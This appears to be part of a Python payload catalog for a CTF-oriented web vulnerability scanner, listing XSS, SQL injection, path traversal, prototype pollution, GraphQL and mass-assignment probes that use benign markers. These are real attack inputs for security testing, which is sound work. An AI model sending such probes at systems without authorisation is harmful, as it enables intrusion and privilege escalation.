...
PAYLOAD_CATALOG: dict[str, list[str]] = {
    ...
    "XSS": [
        ...
        '"><img src=x onerror="document.documentElement.setAttribute(\'data-ctf-xss\',\'1\')">',
        "'><svg onload=\"document.documentElement.setAttribute('data-ctf-xss','1')\">",
...
# v3.44 expanded CTF-oriented coverage. Payloads are short, deterministic probes
# derived from public testing methodologies; high-impact/destructive techniques
# remain verification/manual-only rather than blindly weaponized.
V344_EXPANDED_PAYLOADS: dict[str, list[str]] = {
    "XSS": [
        "<x-ctf data-probe='ctf-xss-probe'>",
        "\"><svg data-probe='ctf-xss-probe'>",
        "'><img src=x data-probe='ctf-xss-probe'>",
        "</textarea><x-ctf data-probe='ctf-xss-probe'>",
        "</script><x-ctf data-probe='ctf-xss-probe'>",
        "<svg><foreignObject><x-ctf data-probe='ctf-xss-probe'></x-ctf></foreignObject></svg>",
        "<math><mtext><x-ctf data-probe='ctf-xss-probe'></x-ctf></mtext></math>",
        "javascript:/*ctf-xss-probe*/",
    ],
    "SQL Injection": [
        "' AND 'a'='a",
    ...
    "LFI / Path Traversal": [
        ...
        "%252e%252e%252fetc%252fhostname",
        "..;/etc/hostname",
        "....//....//etc/hostname",
    ...
    "Prototype Pollution": [
        '__proto__[ctfPolluted]=true',
        'constructor[prototype][ctfPolluted]=true',
        '{"__proto__":{"ctfPolluted":true}}',
        '{"constructor":{"prototype":{"ctfPolluted":true}}}',
    ],
    "LDAP / XPath / XML Injection": [
    ...
    "File Upload / Document Active Content": [
        "html-canary",
        "svg-canary",
        "xml-canary",
        "pdf-javascript-canary",
        "pdf-openaction-canary",
        "csv-formula-canary",
    ],
    "HTTP Parameter Pollution": [
        "id=1&id=2",
    ...
    "GraphQL": [
        ...
        "query{user(id:1){id}}",
        "query{user(id:\"1'\"){id}}",
        "query{search(q:\"<x-ctf data-probe='ctf-xss-probe'>\"){id}}",
    ],
    "API / Mass Assignment": [
        "role=admin",
        "is_admin=true",
...
for _name, _values in V344_EXPANDED_PAYLOADS.items():
    PAYLOAD_CATALOG.setdefault(_name, [])
    for _value in _values:
        if _value not in PAYLOAD_CATALOG[_name]:
            PAYLOAD_CATALOG[_name].append(_value)
